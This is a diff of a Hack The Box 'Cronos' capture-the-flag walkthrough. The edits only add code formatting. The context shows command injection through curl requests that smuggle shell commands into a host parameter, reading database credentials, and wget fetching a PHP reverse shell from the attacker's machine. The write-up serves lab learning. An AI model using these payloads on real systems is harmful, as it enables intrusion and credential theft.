@@ -199,7 +199,7 @@ cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 
 ;; XFR size: 7 records (messages 1, bytes 203)
 ```
 
-So, we need to also add `admin.cronos.htb` on our /etc/hosts file.
+So, we need to also add `admin.cronos.htb` on our `/etc/hosts` file.
 
 Let's check web page:
 
@@ -217,7 +217,7 @@ And we get access.
 ![Screenshot_2022-01-22_16-43-18](https://user-images.githubusercontent.com/42389836/150674781-498194a8-4539-497b-82ae-ccc506a00d56.png)
 
 
-By looking at source code, we have chance to run traceroute or ping to some host.
+By looking at source code, we have chance to run `traceroute` or `ping` to some host.
 
 We try code execution: 
 
@@ -239,7 +239,7 @@ From there, we play a bit with cURL:
 curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+ls+/home"
 ```
 
-and we discover user noulis.
+and we discover user `noulis`.
 
 We can enumerate noulis home directory content:
 
@@ -304,7 +304,7 @@ curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127
 </html>
 ```
 
-We also grab config.php content, and we get credentials to MySQL database:
+We also grab `config.php` content, and we get credentials to MySQL database:
 
 ```
 ..
@@ -329,7 +329,7 @@ curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127
                 admin<br>
 ```
 
-With same technique we discover a "users" table, and we obtain another credential:
+With same technique we discover `users` table, and we obtain another credential:
 
 ```
 curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+mysql+-uadmin+-pkEjdbRigfBHUREiNSDs+admin+-e+%22select+%2A+from+users%3B%22"
@@ -347,7 +347,7 @@ https://md5.gromweb.com/?md5=4f5fffa7b2340178a716e3832451e058
 
 This password is still no valid for SSH access with user "noulis", but obviously is working to access login form.
 
-This time we try if we can use wget to download stuff from our attacking machine.
+This time we try if we can use `wget` to download stuff from our attacking machine.
 
 Let's create a simple text file "sugo" and spawn a Python web server:
 
@@ -398,7 +398,7 @@ $port = 4444;       // CHANGE THIS
 ..
 ```
 
-We use similar wget command and we are able to download our PHP shell from victim machine:
+We use similar `wget` command and we are able to download our PHP shell from victim machine:
 
 ```
 root@kaligra:/opt/htb/Cronos# python3 -m http.server 8888
@@ -457,7 +457,7 @@ The program 'gcc' is currently not installed. To run 'gcc' please ask your admin
 
 ### Privilege escalation
 
-Since VM is called "Cronos", we focus on crontab, and we found a cronjobs which runs every minute with root privilege:
+Since VM is called "Cronos", we focus on `crontab`, and we found a cronjobs which runs every minute with root privilege:
 
 ```
 www-data@cronos:/$ cat /etc/crontab
